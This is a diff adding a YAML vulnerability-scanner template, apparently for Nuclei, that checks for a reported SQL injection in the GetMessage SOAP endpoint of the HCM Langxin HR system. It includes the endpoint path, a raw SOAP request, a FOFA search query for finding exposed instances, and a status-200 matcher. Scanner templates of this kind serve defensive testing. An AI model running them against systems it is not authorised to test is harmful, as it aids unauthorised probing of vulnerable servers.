@@ -1,0 +1,19 @@
+id: poc-eygzpgm1brff5ktr
+info:
+  name: HCM朗新人力资源系统GetMessage存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eygzpgm1brff5ktr'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eygzpgm1brff5ktr
+    fofa: body="人力资源管理系统" && body="Silverlight"
+http:
+- raw:
+  - "POST /ws/GetFunc_code.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetMessage\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetMessage xmlns=\"http://tempuri.org/\">\n      <loginName>1</loginName>\n    </GetMessage>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
